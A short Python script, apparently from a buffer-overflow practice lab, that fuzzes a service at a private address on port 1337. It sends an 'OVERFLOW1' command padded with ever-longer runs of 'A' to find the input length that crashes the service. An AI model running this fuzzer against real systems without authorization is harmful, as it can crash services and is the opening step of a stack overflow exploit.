#!/usr/bin/python

import socket
import sys
import time

ip = "10.10.113.110"
port = 1337
timeout = 5

buffer = []
counter = 100

# This loop sets up the buffer as an array of strings with each string being 100 chars larger than previous.
while len(buffer) < 30:
	buffer.append("A" * counter)
	counter+=100

for string in buffer:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.settimeout(timeout)
		s.connect((ip, port))
		s.recv(1024)
		print("Fuzzing with {} bytes".format(len(string)))
		s.send("OVERFLOW1 " + string + "\r\n")
		s.recv(1024)
		s.close()
	except:
		print("Could not connect to " + ip + ":" + str(port))
		sys.exit(0)
	time.sleep(1)